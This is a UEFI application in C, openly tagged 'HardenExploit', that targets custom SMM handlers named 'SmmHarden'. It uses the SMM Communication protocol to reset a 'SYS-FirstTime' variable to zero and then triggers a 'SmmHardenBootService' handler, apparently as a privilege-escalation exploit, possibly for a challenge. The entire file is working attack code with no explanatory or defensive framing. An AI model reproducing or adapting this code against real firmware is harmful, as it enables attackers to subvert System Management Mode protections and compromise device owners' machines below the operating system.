#include <Library/BaseMemoryLib.h>
#include <Library/DebugLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiLib.h>
#include <Protocol/SmmCommunication.h>

extern EFI_GUID gEfiSmmHardenBootServiceGuid;
extern EFI_GUID gEfiSmmHardenVariableManagerGuid;

VOID
CommunicateSMM(
  IN EFI_GUID  Guid,
  IN VOID     *Data,
  IN UINTN    DataSize
)
{
  EFI_STATUS Status;

  /* Locate the SmmCommunicationProtocol to interact with SMM */
  EFI_SMM_COMMUNICATION_PROTOCOL *SmmCommunication = NULL;
  Status = gBS->LocateProtocol(
    &gEfiSmmCommunicationProtocolGuid,
    NULL,
    (VOID **)&SmmCommunication
    );
  ASSERT_EFI_ERROR(Status);

  /* Interact with SMM */
  EFI_SMM_COMMUNICATE_HEADER *Buffer = AllocateRuntimeZeroPool(sizeof(*Buffer) + DataSize);
  Buffer->HeaderGuid = Guid;
  Buffer->MessageLength = DataSize;
  CopyMem(&Buffer->Data, Data, DataSize);

  SmmCommunication->Communicate(
    SmmCommunication,
    Buffer,
    NULL
  );

  FreePool(Buffer);
}

EFI_STATUS
EFIAPI
UefiMain (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  /* Step 1. Reset SYS-FirstTime*/
  DEBUG ((DEBUG_INFO, "[HardenExploit] Setting SYS-FirstTime to 0\n"));
  CHAR16 *VariableName  = L"SYS-FirstTime";
  CHAR16 *VariableValue = L"0000000000000000";
  CHAR16 Buffer[32];

  CopyMem(Buffer,
          VariableName,
          StrSize(VariableName)
          );
  CopyMem(Buffer + StrLen(VariableName) + 1,
          VariableValue,
          StrSize(VariableValue)
          );
  CommunicateSMM(gEfiSmmHardenVariableManagerGuid, Buffer, 64);

  /* Step 2. Run SmmHardenBootService*/
  DEBUG ((DEBUG_INFO, "[HardenExploit] Exploiting SmmHarden Boot Service!\n"));
  CommunicateSMM(gEfiSmmHardenBootServiceGuid, NULL, 0);

  return EFI_SUCCESS;
}
